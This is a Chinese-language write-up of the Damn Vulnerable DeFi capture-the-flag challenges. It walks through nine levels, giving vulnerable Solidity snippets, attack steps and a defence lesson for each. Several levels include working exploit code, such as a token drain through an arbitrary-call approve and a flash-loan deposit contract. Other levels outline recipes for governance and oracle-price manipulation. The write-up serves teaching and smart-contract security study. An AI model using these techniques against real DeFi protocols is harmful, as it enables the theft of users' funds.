# 02 - Damn Vulnerable DeFi 攻略

## 什么是 Damn Vulnerable DeFi

**Damn Vulnerable DeFi（DVD）** 是一个专注于 DeFi 安全的 CTF 挑战平台。与 Ethernaut 不同，DVD 的每个关卡都模拟了真实 DeFi 协议的攻击场景，更贴近实战。

官方仓库：https://github.com/tinchoabbate/damn-vulnerable-defi

---

## 环境搭建

```bash
# 克隆仓库
git clone https://github.com/tinchoabbate/damn-vulnerable-defi.git
cd damn-vulnerable-defi

# 安装依赖（Foundry 版本）
forge install

# 运行测试验证环境
forge test
```

每个关卡的代码在 `src/` 目录下，测试在 `test/` 目录下。你需要在测试文件的指定位置编写攻击代码，使测试通过。

---

## 关卡攻略

### Level 1: Unstoppable ★★☆☆☆

**攻击类型**：逻辑漏洞 / 拒绝服务

**场景**：一个闪电贷池（Flash Loan Pool），声称"不可阻挡"——任何人都可以借出资产。

**漏洞分析**：

闪电贷函数中有一个严格的断言：

```solidity
uint256 poolBalance = token.balanceOf(address(this));
uint256 balanceBefore = totalAssets(); // 基于内部记账
if (poolBalance != balanceBefore) revert InvalidBalance();
```

`poolBalance` 是实际的 token 余额，`balanceBefore` 是合约内部记录的总资产。如果直接 `transfer` token 给合约（不通过 `deposit`），实际余额增加但内部记账不变，两者不再匹配，闪电贷函数永远 revert。

**攻击步骤**：

```solidity
// 直接转 1 个 token 给池子，破坏余额一致性
token.transfer(address(pool), 1);
// 此后所有闪电贷调用都会 revert
```

**防御教训**：不要依赖 `balanceOf(address(this))` 与内部记账严格相等，应使用 `>=` 或独立追踪。

---

### Level 2: Naive Receiver ★★☆☆☆

**攻击类型**：代付费用 / 资金耗尽

**场景**：一个闪电贷池和一个接收者合约。接收者合约每次被闪电贷调用时需要支付固定手续费。

**漏洞分析**：

闪电贷函数没有限制谁可以指定接收者。攻击者可以反复以受害者合约作为接收者发起闪电贷，每次扣除手续费，直到耗光受害者的余额。

```solidity
// 任何人都可以指定 receiver
function flashLoan(IERC3156FlashBorrower receiver, ...) external {
    // receiver 被迫支付手续费
}
```

**攻击步骤**：

```solidity
// 循环调用闪电贷，每次让受害者付费
for (uint256 i = 0; i < 10; i++) {
    pool.flashLoan(naiveReceiver, address(token), 0, "");
}
```

**防御教训**：闪电贷接收者应该验证调用来源，确保只有自己（或授权方）可以发起针对自己的闪电贷。

---

### Level 3: Truster ★★★☆☆

**攻击类型**：任意外部调用

**场景**：一个闪电贷池，在借出资产后会执行借款方指定的回调。

**漏洞分析**：

```solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external {
    uint256 balanceBefore = token.balanceOf(address(this));
    token.transfer(borrower, amount);

    target.functionCall(data); // 以池子身份执行任意调用！

    uint256 balanceAfter = token.balanceOf(address(this));
    if (balanceAfter < balanceBefore) revert RepayFailed();
}
```

池子会以自身身份调用 `target.functionCall(data)`。攻击者可以让池子调用 `token.approve(attacker, type(uint256).max)`，然后在闪电贷结束后用 `transferFrom` 取走所有 token。

**攻击步骤**：

```solidity
// 1. 借 0 个 token，但让池子 approve 给攻击者
bytes memory data = abi.encodeWithSignature(
    "approve(address,uint256)",
    address(this),
    type(uint256).max
);
pool.flashLoan(0, address(this), address(token), data);

// 2. 利用 approve 取走所有 token
token.transferFrom(address(pool), address(this), token.balanceOf(address(pool)));
```

**防御教训**：合约不应以自身身份执行外部传入的任意调用。

---

### Level 4: Side Entrance ★★★☆☆

**攻击类型**：闪电贷 + 存款逻辑漏洞

**场景**：一个支持 ETH 存取款的闪电贷池。

**漏洞分析**：

```solidity
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;
    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    if (address(this).balance < balanceBefore) revert RepayFailed();
}

function deposit() external payable {
    unchecked { balances[msg.sender] += msg.value; }
}
```

闪电贷只检查 `address(this).balance` 没减少，但在回调中把借到的 ETH 通过 `deposit()` 存回去，余额检查通过了，同时 `balances[attacker]` 增加了。之后攻击者可以 `withdraw` 取走。

**攻击步骤**：

```solidity
contract SideEntranceAttack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}(); // 把借的 ETH 存回去
    }

    receive() external payable {}
}
```

**防御教训**：闪电贷归还检查不能只看 `balance`，应区分"归还"和"存款"操作。

---

### Level 5: The Rewarder ★★★☆☆

**攻击类型**：奖励分配逻辑漏洞

**场景**：一个质押奖励系统，按快照时刻的质押比例分配奖励。

**漏洞分析**：

奖励按快照时刻的质押比例发放。攻击者可以在快照前一瞬间用闪电贷借入大量 token 质押，领取大部分奖励，然后立即取出并归还闪电贷。

**攻击步骤**：

```solidity
// 1. 闪电贷借入大量 token
// 2. 质押到奖励池（触发快照）
// 3. 领取奖励（按比例获得大部分奖励）
// 4. 取出质押
// 5. 归还闪电贷
```

**防御教训**：奖励快照应该有时间延迟，防止即时质押+领取的攻击模式。

---

### Level 6: Selfie ★★★★☆

**攻击类型**：治理攻击

**场景**：一个带治理功能的 DeFi 协议，通过投票可以执行任意操作。

**漏洞分析**：

治理系统按 token 持有量决定投票权。攻击者用闪电贷借入大量 token，获得足够投票权提交并通过恶意提案，提案内容是将池子中所有资金转给攻击者。

**攻击步骤**：

```solidity
// 1. 闪电贷借入大量治理 token
// 2. 用借来的 token 获得投票权
// 3. 提交提案：调用 pool.emergencyExit(attacker)
// 4. 归还闪电贷
// 5. 等提案通过后执行
```

**防御教训**：
- 投票权应基于历史快照，而非当前余额
- 提案执行应有足够的时间锁
- 紧急函数应有多重验证

---

### Level 7: Compromised ★★★★☆

**攻击类型**：预言机操纵

**场景**：一个 NFT 交易所，价格由链下预言机提供。

**漏洞分析**：

预言机的私钥泄露了（通常隐藏在响应头、日志或其他地方）。攻击者可以用泄露的私钥控制预言机，操纵 NFT 价格。

**攻击步骤**：

```solidity
// 1. 从泄露信息中恢复预言机私钥
// 2. 将 NFT 价格设为极低（如 0.001 ETH）
// 3. 以低价买入 NFT
// 4. 将 NFT 价格设为极高（等于交易所余额）
// 5. 以高价卖出 NFT，掏空交易所
// 6. 恢复原始价格
```

**防御教训**：
- 预言机应使用多数据源聚合（如 Chainlink）
- 价格变动应有合理范围限制
- 私钥管理是安全的基础

---

### Level 8: Puppet ★★★☆☆

**攻击类型**：预言机操纵（AMM 价格）

**场景**：一个借贷协议，使用 Uniswap V1 的现货价格作为预言机。

**漏洞分析**：

```solidity
function calculateDepositRequired(uint256 amount) public view returns (uint256) {
    return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
}

function _computeOraclePrice() private view returns (uint256) {
    return uniswapPair.balance * 10 ** 18 / token.balanceOf(uniswapPair);
}
```

现货价格可以在单笔交易内被操纵。攻击者向 Uniswap 大量抛售 token，压低价格，然后以极低的抵押品借出所有 token。

**攻击步骤**：

```solidity
// 1. 在 Uniswap 大量卖出 token → 价格暴跌
// 2. 此时预言机认为 token 很便宜
// 3. 用极少 ETH 作为抵押，借出池中全部 token
```

**防御教训**：不要使用 AMM 现货价格作为预言机，应使用 TWAP（时间加权平均价格）。

---

### Level 9: Puppet V2 ★★★★☆

**攻击类型**：TWAP 理解 + Uniswap V2

**场景**：与 Puppet 类似，但升级到 Uniswap V2，使用了更好的价格计算方式。

**漏洞分析**：

虽然用了 Uniswap V2 的 `price0CumulativeLast`，但如果 TWAP 窗口期太短或没有正确使用，仍然可以被操纵。具体攻击方式取决于实现的时间窗口参数。

**防御教训**：TWAP 的时间窗口要足够长（通常 30 分钟以上），且应结合多个数据源。

---

## 攻击模式总结

| 模式 | 关卡 | 核心思想 |
|------|------|----------|
| **余额不一致** | Unstoppable | 直接转账破坏内部记账与实际余额的一致性 |
| **代付攻击** | Naive Receiver | 利用第三方代为执行来消耗目标资金 |
| **任意调用** | Truster | 以合约身份执行攻击者传入的任意 calldata |
| **存取逻辑混淆** | Side Entrance | 闪电贷 + 存款绕过还款检查 |
| **快照操纵** | The Rewarder | 闪电贷在快照时刻获取不当奖励 |
| **治理攻击** | Selfie | 闪电贷获取投票权，通过恶意提案 |
| **预言机私钥泄露** | Compromised | 控制预言机操纵价格 |
| **现货价格操纵** | Puppet / Puppet V2 | 操纵 AMM 现货价格欺骗借贷协议 |

---

## 通用攻击思路

### 1. 分析资金流向

```
资金从哪里来？ → 闪电贷、自有资金
资金到哪里去？ → 目标合约、攻击者地址
资金怎么验证？ → balance 检查、内部记账、预言机
```

### 2. 找到不变量

每个 DeFi 协议都有核心不变量（invariant），比如：
- 借贷协议：总存款 ≥ 总借款
- AMM：x * y = k
- 奖励系统：奖励总额 = 已分配 + 未分配

攻击的本质就是**打破这些不变量**。

### 3. 闪电贷是万能放大器

大部分 DVD 关卡都涉及闪电贷。闪电贷的威力在于：
- 零成本获得巨额资金
- 在单笔交易内操作，原子性执行
- 放大任何微小的逻辑漏洞

---

## 参考资源

- [Damn Vulnerable DeFi 官方仓库](https://github.com/tinchoabbate/damn-vulnerable-defi)
- [Rekt News - DeFi 攻击事件记录](https://rekt.news/)
- [DeFi Hack Labs - 历史漏洞复现](https://github.com/SunWeb3Sec/DeFiHackLabs)
- [Immunefi - 漏洞赏金平台](https://immunefi.com/)
- [Trail of Bits - 安全审计指南](https://github.com/crytic/building-secure-contracts)
